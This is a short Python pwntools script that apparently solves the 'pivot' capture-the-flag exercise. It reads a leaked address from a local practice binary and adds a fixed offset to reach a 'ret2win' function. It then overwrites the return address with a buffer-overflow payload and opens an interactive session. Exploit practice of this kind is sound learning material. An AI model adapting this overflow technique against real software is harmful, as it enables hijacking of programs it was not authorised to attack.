#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./pivot")
elf = ELF("./pivot")
libc = ELF("./libpivot.so")
pop_rdi = 0x400b73

p.recvuntil(": ")
addr = int(p.recv(14), 16)
log.info("addr : "+hex(addr))

ret2win = addr + 0x3cbbae

log.info("ret2win : "+hex(ret2win))

p.sendlineafter("> ", 'A')
p.sendlineafter("> ", 'A'*(0x20+0x8) + p64(ret2win))

p.interactive()

